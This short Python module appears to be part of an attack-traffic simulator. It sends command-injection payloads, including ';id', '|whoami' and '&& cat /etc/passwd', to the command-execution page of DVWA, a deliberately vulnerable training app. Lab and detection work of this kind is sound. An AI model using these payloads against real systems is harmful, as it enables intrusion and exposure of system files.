"""Command injection against DVWA's command-execution page: one POST with an injected shell separator per step."""
import requests

ATTACK_TYPE = "cmdi"
DEFAULT_RATE = 1.0

PAYLOADS = ["127.0.0.1;id", "127.0.0.1|whoami", "127.0.0.1 && cat /etc/passwd",
            "127.0.0.1;uname -a", "127.0.0.1 | ls -la"]


def step(ctx):
    base = ctx.targets["dvwa"]
    requests.post(f"{base}/vulnerabilities/exec/",
                  data={"ip": ctx.rng.choice(PAYLOADS), "Submit": "Submit"},
                  cookies={"security": "low"}, timeout=ctx.timeout)
